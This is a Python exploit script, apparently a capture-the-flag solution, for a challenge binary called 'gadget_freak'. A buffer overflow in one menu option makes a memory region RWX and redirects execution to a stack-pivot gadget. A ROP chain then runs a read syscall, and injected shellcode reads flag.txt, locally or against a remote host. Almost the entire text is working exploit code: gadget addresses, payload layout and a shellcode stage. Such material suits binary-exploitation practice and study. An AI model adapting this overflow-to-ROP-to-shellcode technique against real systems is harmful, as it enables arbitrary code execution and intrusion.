#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwnie import *
from time import sleep

exe = context.binary = ELF('./gadget_freak', checksec=False)
libc = exe.libc

gdbscript = '''
init-pwndbg
# init-gef-bata
brva 0x1640
brva 0x17FA
c
'''

def start(argv=[]):
    if args.LOCAL:
        p = exe.process()
        if args.GDB:
            gdb.attach(p, gdbscript=gdbscript)
            pause()
    elif args.REMOTE:
        host_port = sys.argv[1:]
        p = remote(host_port[0], int(host_port[1]))
    return p

def menu(choice: int):
    slna(b'Enter your choice: \n', choice)

# ==================== EXPLOIT ====================
p = start()

'''
The program mmap 2 locations: 0x200000 and 0x300000
The buffer overflow bug is in option 2, we can use this to change prot of the second mmap to RWX
The menu(7) call everything we setup due to the bug, so set it at a pivot gadget 0x330e50 (xchg rax, rsp ; ret)
We choose this because before it calls this gadget, it set rax to 0x200000, which is where our payload is
So we just need to write our read syscall ROP chain at 0x200000, write a shellcode to read the flag at 0x30143e,
Because it RWX, so it will continue to execute the shellcode after the ROP chain, think like you're chaining a  ROP (shellcode) + shellcode together
'''

pop_rax = 0x00330d60
syscall = 0x0030143c
pop_rdi = 0x00330d7c
pop_rdx = 0x00330d68
pop_rsi = 0x00330d78

payload = flat(
    pop_rsi, 0x30143e,
    pop_rdi, 0,
    pop_rax, 0,
    pop_rdx, 0x1000,
    syscall,
)

payload = payload.ljust(0x80, b'\x00') + p64(7) + p64(0x330e50)

menu(2)
sla(b'Enter seed (up to 128 characters): \n', payload)

menu(7)

sleep(0.2)
s(asm(shellcraft.cat('./flag.txt')))

interactive()
